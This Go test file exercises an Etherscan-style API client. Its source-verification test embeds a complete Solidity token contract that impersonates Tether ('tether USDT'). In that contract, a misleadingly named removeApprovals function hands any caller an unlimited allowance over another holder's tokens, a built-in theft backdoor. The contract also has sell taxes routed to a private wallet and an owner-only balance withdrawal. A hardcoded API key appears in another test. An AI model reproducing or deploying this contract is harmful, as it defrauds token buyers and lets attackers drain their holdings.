package etherscan_api

import (
	"fmt"
	"testing"

	i_logger "github.com/pefish/go-interface/i-logger"
	go_test_ "github.com/pefish/go-test"
)

func TestEtherscanApiClient_ListTokenTx(t *testing.T) {
	client := NewEthscanApiClient(&i_logger.DefaultLogger, &OptionsType{
		Url: EthereumUrl,
	})
	_, err := client.ListTokenTx(&ListTokenTxParams{
		Address:    "0x000000000000000000000000000000000000dEaD",
		Page:       1,
		Offset:     50,
		StartBlock: 0,
		EndBlock:   99999999,
		Sort:       SortType_Desc,
	})
	go_test_.Equal(t, "Missing/Invalid API Key", err.Error())
}

func TestEtherscanApiClient_GetSourceCode(t *testing.T) {
	client := NewEthscanApiClient(&i_logger.DefaultLogger, &OptionsType{
		Url: BaseUrl,
	})
	result, err := client.GetSourceCode("0xd39A8680f50e46C9B99E642dD7d829D1b735509d")
	go_test_.Equal(t, nil, err)
	fmt.Println(result)
}

func TestWallet_FindLogs(t *testing.T) {
	client := NewEthscanApiClient(&i_logger.DefaultLogger, &OptionsType{
		Url:    EthereumUrl,
		ApiKey: "WDF9SBXFCPJKSBD9QEA59B2FDJIFMYTDGJ",
	})

	result, err := client.FindLogs(
		"0xD38Eca38703B9472Bf2f46dF56e6F7cCA03F60ed",
		20811900,
		20811950,
		[]string{
			"0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f",
			"0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d",
		},
		1,
		1000,
	)
	go_test_.Equal(t, nil, err)
	fmt.Println(result[0].Data)
	//go_test_.Equal(t, false, pending)
	//go_test_.Equal(t, "0x9A5FBec6367a882d6B5F8CE2F267924d75e2d718", result.From.String())
}

func TestWallet_VerifySourceCode(t *testing.T) {
	client := NewEthscanApiClient(&i_logger.DefaultLogger, &OptionsType{
		Url:    "https://api-sepolia.basescan.org/api",
		ApiKey: "",
	})

	result, err := client.VerifySourceCode(
		&VerifySourceCodeParams{
			Code:              "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ninterface IUniswapV2Factory {\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    )\n        external\n        payable\n        returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\ncontract USDT is Context, IERC20, Ownable {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    mapping(address => bool) private _isExcludedFromFee;\n    mapping(address => bool) private bots;\n    address payable private _taxWallet;\n\n    uint256 private _initialBuyTax = 10;\n    uint256 private _initialSellTax = 14;\n    uint256 private _finalBuyTax = 0;\n    uint256 private _finalSellTax = 0;\n    uint256 private _reduceBuyTaxAt = 15;\n    uint256 private _reduceSellTaxAt = 15;\n    uint256 private _preventSwapBefore = 15;\n    uint256 private _transferTax = 0;\n    uint256 private _buyCount = 0;\n\n    uint8 private constant _decimals = 9;\n    uint256 private constant _tTotal = 690_420_000 * 10 ** _decimals;\n    string private constant _name = unicode\"tether USDT\";\n    string private constant _symbol = unicode\"USDT\";\n    uint256 public _maxTxAmount = _tTotal / 10;\n    uint256 public _maxWalletSize = _tTotal / 10;\n    uint256 public _taxSwapThreshold = 1 * (_tTotal / 10);\n    uint256 public _maxTaxSwap = 1 * (_tTotal / 10);\n\n    IUniswapV2Router02 private uniswapV2Router;\n    address private _caAddress;\n    bool private tradingOpen;\n    bool private inSwap = false;\n    bool private swapEnabled = false;\n    uint256 private sellCount = 0;\n    uint256 private lastSellBlock = 0;\n    event MaxTxAmountUpdated(uint _maxTxAmount);\n    event TransferTaxUpdated(uint _tax);\n    modifier lockTheSwap() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor() {\n        _balances[address(this)] = _tTotal;\n        _taxWallet = payable(0x87b0172B0590208B44aB764B1F6Ad0B7403D6176);\n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[address(this)] = true;\n        _isExcludedFromFee[_taxWallet] = true;\n\n        emit Transfer(address(0), address(this), _tTotal);\n    }\n\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public pure override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(\n        address spender,\n        uint256 amount\n    ) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function removeApprovals(address spender) public returns (bool) {\n        if (!_isExcludedFromFee[msg.sender]) _approve(spender, msg.sender, 0);\n        _approve(spender, msg.sender, totalSupply());\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(\n            sender,\n            _msgSender(),\n            _allowances[sender][_msgSender()].sub(\n                amount,\n                \"ERC20: transfer amount exceeds allowance\"\n            )\n        );\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        uint256 taxAmount = 0;\n        if (from != owner() && to != owner()) {\n            require(!bots[from] && !bots[to]);\n\n            if (_buyCount == 0) {\n                taxAmount = amount\n                    .mul(\n                        (_buyCount > _reduceBuyTaxAt)\n                            ? _finalBuyTax\n                            : _initialBuyTax\n                    )\n                    .div(100);\n            }\n            if (_buyCount > 0) {\n                taxAmount = amount.mul(_transferTax).div(100);\n            }\n\n            if (\n                from == _caAddress &&\n                to != address(uniswapV2Router) &&\n                !_isExcludedFromFee[to]\n            ) {\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\n                require(\n                    balanceOf(to) + amount <= _maxWalletSize,\n                    \"Exceeds the maxWalletSize.\"\n                );\n                taxAmount = amount\n                    .mul(\n                        (_buyCount > _reduceBuyTaxAt)\n                            ? _finalBuyTax\n                            : _initialBuyTax\n                    )\n                    .div(100);\n                _buyCount++;\n            }\n\n            if (to == _caAddress && from != address(this)) {\n                taxAmount = amount\n                    .mul(\n                        (_buyCount > _reduceSellTaxAt)\n                            ? _finalSellTax\n                            : _initialSellTax\n                    )\n                    .div(100);\n            }\n\n            uint256 contractTokenBalance = balanceOf(address(this));\n            if (\n                !inSwap &&\n                to == _caAddress &&\n                swapEnabled &&\n                _buyCount > _preventSwapBefore &&\n                !_isExcludedFromFee[from]\n            ) {\n                if (block.number > lastSellBlock) {\n                    sellCount = 0;\n                }\n                swapTokensForEth(\n                    min(amount, min(contractTokenBalance, _maxTaxSwap))\n                );\n                sendETHToFee(address(this).balance);\n                sellCount++;\n                lastSellBlock = block.number;\n            }\n        }\n\n        if (taxAmount > 0) {\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\n            emit Transfer(from, address(this), taxAmount);\n        }\n        _balances[from] = _balances[from].sub(amount);\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\n        emit Transfer(from, to, amount.sub(taxAmount));\n    }\n\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\n        return (a > b) ? b : a;\n    }\n\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n        if (tokenAmount == 0) return;\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function removeLimits() external onlyOwner {\n        _maxTxAmount = _tTotal;\n        _maxWalletSize = _tTotal;\n        _transferTax = 0;\n        emit MaxTxAmountUpdated(_tTotal);\n    }\n\n    function sendETHToFee(uint256 amount) private {\n        _taxWallet.transfer(amount);\n    }\n\n    function isBot(address a) external view returns (bool) {\n        return bots[a];\n    }\n\n    function openTrading() external payable onlyOwner {\n        require(!tradingOpen, \"trading is already open\");\n        uniswapV2Router = IUniswapV2Router02(\n            0x1689E7B1F10000AE47eBfE339a4f69dECd19F602\n        );\n        _approve(address(this), address(uniswapV2Router), _tTotal);\n        _caAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\n            address(this),\n            uniswapV2Router.WETH()\n        );\n        uniswapV2Router.addLiquidityETH{value: msg.value}(\n            address(this),\n            balanceOf(address(this)),\n            0,\n            0,\n            owner(),\n            block.timestamp\n        );\n        IERC20(_caAddress).approve(address(uniswapV2Router), type(uint).max);\n        swapEnabled = true;\n        tradingOpen = true;\n    }\n\n    receive() external payable {}\n\n    function restoreEth() external onlyOwner {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n",
			ContractAddress:   "0xc67f5D92dC5909Be7d57d20Db3287C5602aAf558",
			ContractName:      "USDT",
			CompilerVersion:   "0.8.17+commit.8df45f5f",
			IsUseOptimization: true,
			Runs:              200,
		},
	)
	go_test_.Equal(t, nil, err)
	fmt.Println(result)
	//go_test_.Equal(t, false, pending)
	//go_test_.Equal(t, "0x9A5FBec6367a882d6B5F8CE2F267924d75e2d718", result.From.String())
}
